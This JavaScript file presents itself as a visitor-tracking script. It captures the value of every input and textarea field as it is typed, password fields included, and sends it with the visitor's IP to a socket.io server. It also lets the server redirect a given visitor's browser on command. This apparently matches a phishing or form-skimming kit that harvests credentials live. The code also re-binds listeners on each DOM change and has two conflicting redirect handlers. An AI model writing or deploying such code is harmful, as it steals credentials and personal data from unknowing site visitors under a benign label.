// Client-side visitor tracking script
document.addEventListener('DOMContentLoaded', function() {
  // Check if socket.io is available
  if (typeof io !== 'undefined') {
    // Connect to socket.io server
    const socket = io();
    
    // Get client IP address
    let clientIP = null;
    
    // Function to get public IP address
    async function getClientIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        clientIP = data.ip;
        console.log('Client IP detected:', clientIP);
        return clientIP;
      } catch (error) {
        console.error('Failed to fetch IP:', error);
        return null;
      }
    }
    
    // Initialize by getting the IP, then send page view
    getClientIP().then(ip => {
      // Get current path
      const currentPath = window.location.pathname;
      
      // Skip tracking for dashboard paths
      if (currentPath.startsWith('/dashboard')) {
        console.log('Dashboard path detected, skipping visitor tracking');
        return;
      }
      
      // Send current page path to server on page load
      socket.emit('page-view', { 
        path: currentPath,
        title: document.title,
        referrer: document.referrer,
        clientIP: ip
      });
    });
    
    // Listen for redirect events from server
    socket.on('redirect', function(data) {
      // Check if this redirect is for our IP
      if (data.ip && clientIP && data.ip === clientIP) {
        console.log('Received redirect instruction to:', data.redirectUrl);
        // Redirect the browser
        window.location.href = data.redirectUrl;
      }
    });
    
    // Track input fields across all pages
    const inputDebounceDelay = 500; // ms
    let inputDebounceTimers = {};
    
    // Function to track input changes
    function trackInputs() {
      const inputs = document.querySelectorAll('input, textarea');
      
      inputs.forEach(input => {
    
        // Generate a unique ID for this input
        const inputId = input.id || input.name || input.placeholder || 'unnamed-' + Math.random().toString(36).substr(2, 9);
        
        // Add input event listener
        input.addEventListener('input', function(e) {
          // Clear previous timer for this input
          if (inputDebounceTimers[inputId]) {
            clearTimeout(inputDebounceTimers[inputId]);
          }
          
          // Set new timer to debounce rapid typing
          inputDebounceTimers[inputId] = setTimeout(() => {
            // Send input data to server with client IP
            socket.emit('input-data', {
              path: window.location.pathname,
              inputId: inputId,
              inputType: input.type,
              inputName: input.name || '',
              inputValue: input.value,
              timestamp: new Date().toISOString(),
              clientIP: clientIP // Include client IP from the frontend
            });
          }, inputDebounceDelay);
        });
      });
    }
    
    // Track inputs on page load
    trackInputs();
    
    // Track inputs after DOM changes (for dynamically added inputs)
    const observer = new MutationObserver(function(mutations) {
      trackInputs();
    });
    
    // Observe the entire document for changes
    observer.observe(document.body, { childList: true, subtree: true });
    
    // Track page navigation via History API
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    
    history.pushState = function() {
      originalPushState.apply(this, arguments);
      trackPageView();
    };
    
    history.replaceState = function() {
      originalReplaceState.apply(this, arguments);
      trackPageView();
    };
    
    window.addEventListener('popstate', trackPageView);
    
    function trackPageView() {
      socket.emit('page-view', { 
        path: window.location.pathname,
        title: document.title,
        referrer: document.referrer
      });
    }
    
    // Handle redirect messages from server
    socket.on('redirect', (data) => {
      // Get client IP from server response or use a placeholder
      const currentIp = socket.clientIp || '::1';
      
      if (data.ip === currentIp || data.ip === '::1' || data.ip.includes('127.0.0.1')) {
        window.location.href = data.url;
      }
    });
  }
});
